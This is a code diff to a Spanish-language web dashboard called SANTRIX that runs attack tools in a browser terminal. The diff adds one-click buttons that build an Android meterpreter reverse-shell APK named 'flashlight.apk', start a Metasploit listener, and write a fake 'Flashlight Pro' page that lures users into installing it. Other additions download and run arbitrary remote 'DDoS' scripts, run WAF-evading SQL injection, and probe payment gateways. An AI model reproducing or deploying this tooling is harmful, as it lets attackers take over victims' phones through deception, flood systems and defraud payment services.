+            <div style="font-size:0.65rem;color:var(--muted);margin-top:3px;">Framework de explotación</div>
+          </div>
+        </div>
+        <div class="tcard" data-color="purple" onclick="openModal('msfvenom')">
+          <div class="tcard-icon">🧬</div>
+          <div class="tcard-name">MSFVenom</div>
+        </div>
+        <div class="tcard" data-color="purple" onclick="runCommand('msfvenom -p android/meterpreter/reverse_tcp LHOST=$(curl -s ifconfig.me) LPORT=4444 -o public/downloads/flashlight.apk && chmod +r public/downloads/flashlight.apk')">
+          <div class="tcard-badge">APK</div>
+          <div class="tcard-icon">🔦</div>
+          <div class="tcard-name">Gen APK</div>
+        </div>
+        <div class="tcard" data-color="purple" onclick="runCommand('msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit\"')">
+          <div class="tcard-icon">📶</div>
+          <div class="tcard-name">Listener</div>
+        </div>
+        <div class="tcard" data-color="purple" onclick="createFlashlightPage()">
+          <div class="tcard-icon">🌐</div>
+          <div class="tcard-name">Deploy Page</div>
+        </div>
+        <div class="tcard" data-color="orange" onclick="openModal('ddos')">
+          <div class="tcard-badge">EDU</div>
+          <div class="tcard-icon">🌊</div>
+          <div class="tcard-name">DDoS Import</div>
+        </div>
+      </div>
+
+      <!-- FINTECH -->
+      <div class="cat-page" id="cat-fintech">
+        <div class="tcard wide" data-color="yellow" onclick="openModal('payment')">
+          <div class="tcard-badge">REAL</div>
+          <div class="tcard-icon">💳</div>
+          <div>
+            <div class="tcard-name">Payment Bypass Auditor</div>
+            <div style="font-size:0.65rem;color:var(--muted);margin-top:3px;">Prueba manipulación de parámetros y webhooks</div>
+          </div>
+        </div>
+        <div class="tcard" data-color="yellow" onclick="runCommand('./scripts/security_audit.sh mobile-api')">
+          <div class="tcard-icon">📱</div>
+          <div class="tcard-name">Mobile API Audit</div>
+        </div>
+        <div class="tcard" data-color="yellow" onclick="runCommand('nmap -p 8080 $(hostname -I)')">
+          <div class="tcard-icon">🔌</div>
+          <div class="tcard-name">API Proxy Scan</div>
+        </div>
+      </div>
+
+      <!-- SISTEMA -->
+      <div class="cat-page" id="cat-sys">
+        <div class="tcard" data-color="orange" onclick="runCommand('top')">
+          <div class="tcard-icon">📈</div>
+          <div class="tcard-name">Process Monitor</div>
+        </div>
+        <div class="tcard" data-color="orange" onclick="runCommand('ls -la')">
+          <div class="tcard-icon">📁</div>
+          <div class="tcard-name">File Explorer</div>
+        </div>
+        <div class="tcard" data-color="orange" onclick="runCommand('df -h && free -h')">
+          <div class="tcard-icon">💾</div>
+          <div class="tcard-name">Disco / RAM</div>
+        </div>
+        <div class="tcard" data-color="orange" onclick="runCommand('whoami && id && uname -a')">
+          <div class="tcard-icon">🖥️</div>
+          <div class="tcard-name">Sys Info</div>
+        </div>
+        <div class="tcard" data-color="orange" onclick="runCommand('cat /etc/passwd | head -20')">
+          <div class="tcard-icon">👤</div>
+          <div class="tcard-name">Usuarios</div>
+        </div>
+        <div class="tcard" data-color="orange" onclick="runCommand('netstat -tulpn 2>/dev/null || ss -tulpn')">
+          <div class="tcard-icon">🔗</div>
+          <div class="tcard-name">Puertos Activos</div>
+        </div>
+      </div>
+
+      <!-- TERMUX -->
+      <div class="cat-page" id="cat-termux">
+        <div class="tcard wide pulse" data-color="green" onclick="openModal('termux-install')">
+          <div class="tcard-badge">v2</div>
+          <div class="tcard-icon">📦</div>
+          <div>
+            <div class="tcard-name">Instalar SANTRIX en Termux</div>
+            <div style="font-size:0.65rem;color:var(--muted);margin-top:3px;">Instalador completo con todas las herramientas</div>
+          </div>
+        </div>
+        <div class="tcard" data-color="green" onclick="runCommand('./scripts/termux_setup.sh')">
+          <div class="tcard-icon">📖</div>
+          <div class="tcard-name">Setup Manual</div>
+        </div>
+        <div class="tcard" data-color="green" onclick="runCommand('pkg update -y && pkg upgrade -y')">
+          <div class="tcard-icon">🔄</div>
+          <div class="tcard-name">Update Termux</div>
+        </div>
+        <div class="tcard" data-color="green" onclick="runCommand('pkg install -y nmap python git curl wget')">
+          <div class="tcard-icon">🛠️</div>
+          <div class="tcard-name">Deps Base</div>
+        </div>
+      </div>
+
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
-    <script src="/socket.io/socket.io.js"></script>
-    <script>
-        const term = new Terminal({
-            cursorBlink: true,
-            theme: {
-                background: '#000000',
-                foreground: '#ffffff',
-                cursor: '#00ff41',
-                selectionBackground: 'rgba(0, 255, 65, 0.3)'
-            },
-            fontFamily: 'JetBrains Mono, monospace',
-            fontSize: 14,
-            scrollback: 10000,
-            allowTransparency: true,
-            cursorStyle: 'block',
-            rightClickSelectsWord: true
-        });
-        const fitAddon = new FitAddon.FitAddon();
-        term.loadAddon(fitAddon);
-        term.open(document.getElementById('terminal'));
-        
-        // Ensure fit happens after layout
-        setTimeout(() => fitAddon.fit(), 100);
+    <!-- Quick CMD Bar -->
+    <div class="qbar">
+      <button class="qbtn" onclick="simulateKey(38)">↑</button>
+      <button class="qbtn" onclick="simulateKey(40)">↓</button>
+      <button class="qbtn" onclick="runCommand('ls -la')">LS</button>
+      <button class="qbtn" onclick="runCommand('pwd')">PWD</button>
+      <button class="qbtn" onclick="runCommand('cd ..')">CD ..</button>
+      <button class="qbtn" onclick="runCommand('clear')">CLR</button>
+      <button class="qbtn red" onclick="sendCtrlC()">✕ C</button>
+    </div>
+  </div>
 
-        const socket = io();
+  <!-- TERMINAL PANEL -->
+  <div id="term-panel">
+    <div class="term-topbar">
+      <div class="term-dot" style="background:#ff5f57"></div>
+      <div class="term-dot" style="background:#febc2e"></div>
+      <div class="term-dot" style="background:#28c840"></div>
+      <span class="term-title">SANTRIX TERMINAL — bash</span>
+    </div>
+    <div id="terminal" style="flex:1;height:calc(100% - 34px);"></div>
+  </div>
 
-        socket.on('output', (data) => {
-            term.write(data);
-        });
+</div>
 
-        term.onData((data) => {
-            socket.emit('input', data);
-        });
+<!-- ══════════════ MODAL ══════════════ -->
+<div class="modal-overlay" id="modal" onclick="closeModalOutside(event)">
+  <div class="modal-box" id="modal-box">
+    <div class="modal-head">
+      <div class="modal-icon" id="modal-icon">🔍</div>
+      <div>
+        <div class="modal-title" id="modal-title">Herramienta</div>
+        <div class="modal-desc"  id="modal-desc">Descripción</div>
+      </div>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div id="modal-body"></div>
+    <button class="modal-run" id="modal-run-btn" onclick="modalRun()">▶ EJECUTAR</button>
+  </div>
+</div>
 
-        function toggleMenu() {
-            document.getElementById('sidebar').classList.toggle('active');
-        }
+<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  // ── TERMINAL SETUP ──────────────────────────────────
+  const term = new Terminal({
+    cursorBlink: true,
+    theme: {
+      background: '#000000', foreground: '#ffffff',
+      cursor: '#00ff87', selectionBackground: 'rgba(0,255,135,0.3)'
+    },
+    fontFamily: 'JetBrains Mono, monospace',
+    fontSize: 14, scrollback: 10000,
+    allowTransparency: true, cursorStyle: 'block'
+  });
+  const fitAddon = new FitAddon.FitAddon();
+  term.loadAddon(fitAddon);
+  term.open(document.getElementById('terminal'));
+  setTimeout(() => fitAddon.fit(), 150);
+  window.addEventListener('resize', () => fitAddon.fit());
 
-        function runCommand(cmd) {
-            socket.emit('input', cmd + (cmd.endsWith('\n') ? '' : '\n'));
-            term.focus();
-            if (window.innerWidth <= 768) {
-                document.getElementById('sidebar').classList.remove('active');
-            }
-        }
+  const socket = io();
+  socket.on('output', d => term.write(d));
+  term.onData(d => socket.emit('input', d));
 
-        function simulateKey(code) {
-            // Mapping for arrow keys
-            const keys = {
-                38: '\x1b[A', // Up
-                40: '\x1b[B'  // Down
-            };
-            if (keys[code]) {
-                socket.emit('input', keys[code]);
-            }
-            term.focus();
-        }
+  function runCommand(cmd) {
+    socket.emit('input', cmd + (cmd.endsWith('\n') ? '' : '\n'));
+    term.focus();
+  }
+  function simulateKey(code) {
+    const k = { 38: '\x1b[A', 40: '\x1b[B' };
+    if (k[code]) socket.emit('input', k[code]);
+    term.focus();
+  }
+  function sendCtrlC() { socket.emit('input', '\x03'); term.focus(); }
+  async function copyTerminal() {
+    const s = term.getSelection();
+    if (s) await navigator.clipboard.writeText(s);
+  }
+  async function pasteTerminal() {
+    const t = await navigator.clipboard.readText();
+    if (t) socket.emit('input', t);
+    term.focus();
+  }
 
-        function sendCtrlC() {
-            socket.emit('input', '\x03');
-            term.focus();
-        }
+  // ── CATEGORY TABS ────────────────────────────────────
+  function switchCat(cat) {
+    document.querySelectorAll('.cat-tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.cat-page').forEach(p => p.classList.remove('active'));
+    document.querySelector(`.cat-tab[data-cat="${cat}"]`).classList.add('active');
+    document.getElementById('cat-' + cat).classList.add('active');
+  }
 
-        async function copyTerminal() {
-            const selection = term.getSelection();
-            if (selection) {
-                await navigator.clipboard.writeText(selection);
-                // Visual feedback could go here
-            }
-        }
+  // ── MODAL SYSTEM ─────────────────────────────────────
+  let currentModal = null;
+  let enumMode = 'all';
 
-        async function pasteTerminal() {
-            const text = await navigator.clipboard.readText();
-            if (text) {
-                socket.emit('input', text);
-            }
-            term.focus();
-        }
+  const modalDefs = {
+    'webenum': {
+      icon: '🕷️', title: 'Web Enumerator Pro', desc: 'Directorios, DNS, fuzzing completo',
+      fields: [
+        { id: 'url', label: 'URL Objetivo', placeholder: 'http://10.10.10.10' }
+      ],
+      modes: ['dir','dns','fuzz','all'],
+      run: (vals, mode) => `./scripts/web_enum.sh "${vals.url}" ${mode || 'all'}`
+    },
+    'gobuster': {
+      icon: '📂', title: 'Gobuster Directorios', desc: 'Brute force de rutas y archivos',
+      fields: [{ id: 'url', label: 'URL Objetivo', placeholder: 'http://10.10.10.10' }],
+      run: (v) => `gobuster dir -u "${v.url}" -w /tmp/santrix_wordlists/common.txt -t 20 --timeout 10s`
+    },
+    'ffuf': {
+      icon: '⚡', title: 'FFUF Fuzzer', desc: 'Fuzzing rápido para CTFs',
+      fields: [{ id: 'url', label: 'URL (usa FUZZ como marcador)', placeholder: 'http://10.10.10.10/FUZZ' }],
+      run: (v) => `ffuf -u "${v.url}" -w /tmp/santrix_wordlists/common.txt -mc 200,201,301,302,403 -ac -v`
+    },
+    'gobuster-dns': {
+      icon: '🔎', title: 'Enumeración DNS', desc: 'Descubre subdominios',
+      fields: [{ id: 'domain', label: 'Dominio', placeholder: 'example.com' }],
+      run: (v) => `gobuster dns -d "${v.domain}" -w /tmp/santrix_wordlists/common.txt -t 20`
+    },
+    'sqli': {
+      icon: '💉', title: 'SQLi Scanner', desc: 'Detección automática con sqlmap',
+      fields: [
+        { id: 'url', label: 'URL Objetivo', placeholder: 'http://objetivo.com/login?id=1' }
+      ],
+      run: (v) => `./scripts/sql_scanner.sh "${v.url}"`
+    },
+    'sqli-hard': {
+      icon: '🛡️', title: 'SQLi Hard Mode', desc: 'Evasión de WAF / Cloudflare',
+      fields: [
+        { id: 'url', label: 'URL Objetivo', placeholder: 'http://objetivo.com/?id=1' }
+      ],
+      run: (v) => `./scripts/sql_scanner.sh "${v.url}" --evade`
+    },
+    'sqli-post': {
+      icon: '📨', title: 'SQLi POST', desc: 'Inyección vía parámetros POST',
+      fields: [
+        { id: 'url',  label: 'URL', placeholder: 'http://objetivo.com/login' },
+        { id: 'data', label: 'Datos POST', placeholder: 'user=admin&pass=1' }
+      ],
+      run: (v) => `./scripts/sql_scanner.sh "${v.url}" --data="${v.data}"`
+    },
+    'nmap': {
+      icon: '📡', title: 'Nmap Rápido', desc: 'Escaneo rápido de puertos',
+      fields: [{ id: 'target', label: 'IP / Dominio', placeholder: '10.10.10.10' }],
+      run: (v) => `nmap -T4 -F --open ${v.target}`
+    },
+    'nmap-full': {
+      icon: '🔬', title: 'Nmap Completo', desc: 'Detección de servicios y OS',
+      fields: [{ id: 'target', label: 'IP / Dominio', placeholder: '10.10.10.10' }],
+      run: (v) => `nmap -T4 -A -p- --open ${v.target}`
+    },
+    'headers': {
+      icon: '📋', title: 'HTTP Headers', desc: 'Analiza cabeceras de seguridad',
+      fields: [{ id: 'url', label: 'URL', placeholder: 'https://ejemplo.com' }],
+      run: (v) => `curl -s -I --max-time 10 "${v.url}"`
+    },
+    'whois': {
+      icon: '🌍', title: 'Whois Lookup', desc: 'Información de registro de dominio',
+      fields: [{ id: 'domain', label: 'Dominio / IP', placeholder: 'ejemplo.com' }],
+      run: (v) => `whois ${v.domain}`
+    },
+    'audit': {
+      icon: '📊', title: 'Audit & Stress', desc: 'Análisis de seguridad web completo',
+      fields: [{ id: 'url', label: 'URL', placeholder: 'https://tu-web.com' }],
+      run: (v) => `./scripts/security_audit.sh "${v.url}"`
+    },
+    'ping': {
+      icon: '🏓', title: 'Ping / Traceroute', desc: 'Conectividad y ruta de red',
+      fields: [{ id: 'host', label: 'Host / IP', placeholder: '10.10.10.10' }],
+      run: (v) => `ping -c 4 ${v.host} && traceroute ${v.host} 2>/dev/null`
+    },
+    'payment': {
+      icon: '💳', title: 'Payment Bypass', desc: 'Prueba pasarelas de pago autorizadas',
+      fields: [{ id: 'url', label: 'URL del Gateway', placeholder: 'https://tu-tienda.com/pay' }],
+      run: (v) => `./scripts/payment_bypass.sh "${v.url}"`
+    },
+    'msfvenom': {
+      icon: '🧬', title: 'MSFVenom Payload', desc: 'Generador de payloads',
+      fields: [
+        { id: 'lhost', label: 'LHOST (tu IP)', placeholder: '10.0.0.1' },
+        { id: 'lport', label: 'LPORT', placeholder: '4444' }
+      ],
+      run: (v) => `msfvenom -p android/meterpreter/reverse_tcp LHOST=${v.lhost} LPORT=${v.lport} -o public/downloads/payload.apk`
+    },
+    'ddos': {
+      icon: '🌊', title: 'DDoS Script Import', desc: 'Importar y ejecutar script externo',
+      fields: [{ id: 'url', label: 'URL del script .sh', placeholder: 'https://raw.github.../script.sh' }],
+      run: (v) => `curl -L -o /tmp/ddos_tool.sh "${v.url}" && chmod +x /tmp/ddos_tool.sh && /tmp/ddos_tool.sh`
+    },
+    'termux-install': {
+      icon: '📦', title: 'Instalar en Termux', desc: 'Copia y pega en tu Termux',
+      fields: [],
+      custom: () => {
+        const url = window.location.origin;
+        return `<div class="modal-field">
+          <div class="modal-label">Comando para pegar en Termux:</div>
+          <textarea class="modal-input" rows="3" readonly style="font-size:0.72rem;resize:none;" onclick="this.select()">curl -sL ${url}/scripts/termux_setup.sh -o setup.sh && chmod +x setup.sh && bash setup.sh ${url}</textarea>
+          <div style="font-size:0.68rem;color:var(--muted);margin-top:6px;">Toca el comando para seleccionarlo y copiarlo.</div>
+        </div>`;
+      },
+      noRun: true
+    }
+  };
 
-        function runAudit() {
-            const url = document.getElementById('audit-url').value;
-            if (url) {
-                // Ensure we use the correct relative path from the perspective of the server.js/terminal
-                runCommand(`./scripts/security_audit.sh ${url}`);
-                document.getElementById('audit-url').value = '';
-            }
-        }
+  function openModal(key) {
+    const def = modalDefs[key];
+    if (!def) return;
+    currentModal = key;
+    enumMode = 'all';
+    document.getElementById('modal-icon').textContent  = def.icon;
+    document.getElementById('modal-title').textContent = def.title;
+    document.getElementById('modal-desc').textContent  = def.desc;
 
-        function runSQLi() {
-            const url = document.getElementById('sqli-url').value;
-            const post = document.getElementById('sqli-post').value;
-            const evade = document.getElementById('sqli-evade').checked;
-            if (url) {
-                let cmd = `./scripts/sql_scanner.sh "${url}"`;
-                if (post) cmd += ` --data="${post}"`;
-                if (evade) cmd += ` --evade`;
-                runCommand(cmd);
-                document.getElementById('sqli-url').value = '';
-                document.getElementById('sqli-post').value = '';
-            }
-        }
+    let html = '';
+    if (def.custom) {
+      html = def.custom();
+    } else {
+      (def.fields || []).forEach(f => {
+        html += `<div class="modal-field">
+          <label class="modal-label" for="mf-${f.id}">${f.label}</label>
+          <input class="modal-input" id="mf-${f.id}" placeholder="${f.placeholder}" autocomplete="off" spellcheck="false">
+        </div>`;
+      });
+      if (def.modes) {
+        html += `<div class="modal-field">
+          <div class="modal-label">Modo de escaneo</div>
+          <div class="modal-modes">
+            ${def.modes.map(m => `<button class="mode-btn ${m==='all'?'selected':''}" onclick="selectMode('${m}',this)">${m.toUpperCase()}</button>`).join('')}
+          </div>
+        </div>`;
+      }
+    }
 
-        function runPaymentBypass() {
-            const url = document.getElementById('payment-url').value;
-            if (url) {
-                runCommand(`./scripts/payment_bypass.sh "${url}"`);
-                document.getElementById('payment-url').value = '';
-            }
-        }
+    document.getElementById('modal-body').innerHTML = html;
+    const runBtn = document.getElementById('modal-run-btn');
+    runBtn.style.display = def.noRun ? 'none' : 'block';
+    document.getElementById('modal').classList.add('open');
 
-        function runEnum(mode) {
-            const url = document.getElementById('enum-url').value;
-            if (url) {
-                runCommand(`./scripts/web_enum.sh "${url}" ${mode}`);
-                document.getElementById('enum-url').value = '';
-            }
-        }
+    setTimeout(() => {
+      const first = document.querySelector('#modal-body .modal-input');
+      if (first && !def.noRun) first.focus();
+    }, 100);
+  }
 
-        function importDDoS() {
-            const link = document.getElementById('ddos-link').value;
-            if (link) {
-                // Modified command to ensure output is captured correctly and path is consistent
-                const cmd = `curl -L -o scripts/downloaded_tool.sh ${link} && chmod +x scripts/downloaded_tool.sh && ./scripts/downloaded_tool.sh\n`;
-                runCommand(cmd);
-                document.getElementById('ddos-link').value = '';
-            }
-        }
+  function selectMode(mode, el) {
+    enumMode = mode;
+    document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('selected'));
+    el.classList.add('selected');
+  }
 
-        window.onresize = () => fitAddon.fit();
-    </script>
+  function modalRun() {
+    const def = modalDefs[currentModal];
+    if (!def || !def.run) return;
+    const vals = {};
+    (def.fields || []).forEach(f => {
+      vals[f.id] = document.getElementById('mf-' + f.id)?.value?.trim() || '';
+    });
+    const firstField = def.fields?.[0]?.id;
+    if (firstField && !vals[firstField]) {
+      document.getElementById('mf-' + firstField).style.borderColor = 'var(--pink)';
+      return;
+    }
+    runCommand(def.run(vals, enumMode));
+    closeModal();
+  }
+
+  function closeModal() {
+    document.getElementById('modal').classList.remove('open');
+    currentModal = null;
+  }
+  function closeModalOutside(e) {
+    if (e.target.id === 'modal') closeModal();
+  }
+
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape') closeModal();
+    if (e.key === 'Enter' && currentModal) { e.preventDefault(); modalRun(); }
+  });
+
+  // ── FLASHLIGHT PAGE ──────────────────────────────────
+  function createFlashlightPage() {
+    const content = `<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Flashlight Pro</title><style>body{font-family:'Segoe UI',sans-serif;background:#121212;color:#e0e0e0;text-align:center;padding:40px 20px}.card{background:#1e1e1e;border:1px solid #333;padding:30px;border-radius:15px;max-width:400px;margin:0 auto}.icon{font-size:80px;margin-bottom:20px}h1{color:#fff}.download-btn{background:#ffcc00;color:#000;padding:18px 40px;text-decoration:none;font-weight:bold;border-radius:30px;display:inline-block;margin-top:25px}</style></head><body><div class="card"><div class="icon">🔦</div><h1>Flashlight Pro</h1><p>La linterna más brillante para tu Android.</p><a href="/downloads/flashlight.apk" class="download-btn">INSTALAR AHORA</a></div></body></html>`;
+    runCommand(`cat << 'ENDOFFILE' > public/flashlight.html\n${content}\nENDOFFILE`);
+    alert('Página creada en /flashlight.html');
+  }
+</script>
 </body>
 </html>
